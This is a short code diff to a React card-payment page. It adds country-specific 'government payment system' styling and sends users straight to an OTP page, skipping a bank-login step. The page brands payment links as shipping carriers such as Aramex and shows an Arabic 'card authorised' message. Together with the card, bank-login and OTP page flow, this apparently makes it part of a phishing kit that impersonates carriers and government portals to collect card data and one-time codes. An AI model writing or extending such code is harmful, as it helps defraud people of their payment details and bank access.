@@ -5,6 +5,7 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { getServiceBranding } from "@/lib/serviceLogos";
+import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
 import { Shield, Lock, Calendar } from "lucide-react";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
 import { useLink } from "@/hooks/useSupabase";
@@ -38,6 +39,9 @@ const PaymentCardInput = () => {
   const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
+  
+  // Get government payment system for styling
+  const govSystem = getGovernmentPaymentSystem(selectedCountry);
 
   const shippingInfo = linkData?.payload as any;
 
@@ -207,12 +211,8 @@ const PaymentCardInput = () => {
       description: "تم تفويض البطاقة بنجاح",
     });
     
-    // Navigate to bank login page if bank is selected, otherwise go to OTP
-    if (selectedBankId && selectedBankId !== 'skipped') {
-      navigate(`/pay/${id}/bank-login`);
-    } else {
-      navigate(`/pay/${id}/otp`);
-    }
+    // Navigate directly to OTP (skip bank login for card payment)
+    navigate(`/pay/${id}/otp`);
   };
   
   return (
